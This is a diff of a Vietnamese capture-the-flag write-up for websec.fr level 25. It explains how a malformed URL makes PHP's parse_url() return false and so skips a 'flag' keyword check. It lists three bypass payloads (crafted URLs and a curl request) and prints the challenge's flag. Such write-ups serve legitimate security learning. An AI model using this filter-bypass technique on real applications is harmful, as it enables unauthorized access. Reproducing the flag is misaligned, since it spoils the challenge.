@@ -23,13 +23,19 @@ Ví dụ tham khảo ở : [PHP: parse_url()](https://www.php.net/manual/en/func
 - Tiếp theo vòng lặp foreach sẽ chạy từng phần tử trong mảng `$query` vừa gán và kiểm xa xem nó có chứa chuỗi `flag` ko => Nếu có thì nó sẽ die() 
 - Cách bypass của chúng ta là sẽ không để nó chạy vào vòng lặp foreach bằng cách làm cho url sai => $query = false => thì nó sẽ ko chạy vòng lặp đc 
 ### payload 1:
-`https://websec.fr/level25/index.php?page=flag&foo=127.0:80`
+```url
+https://websec.fr/level25/index.php?page=flag&foo=127.0:80
+```
 
 ## payload 2: 
-`https://websec.fr/level25/index.php?page=flag&a:1`
+```url
+https://websec.fr/level25/index.php?page=flag&a:1
+```
 
 ## payload 3:
 parse_str() có thể bị bypass qua curl
-`curl https://websec.fr/level25/index.php?page=flag`
+```cmd
+curl https://websec.fr/level25/index.php?page=flag
+```
 
 Flag: `WEBSEC{How_am_I_supposed_to_parse_uri_when_everything_is_so_broooken}`
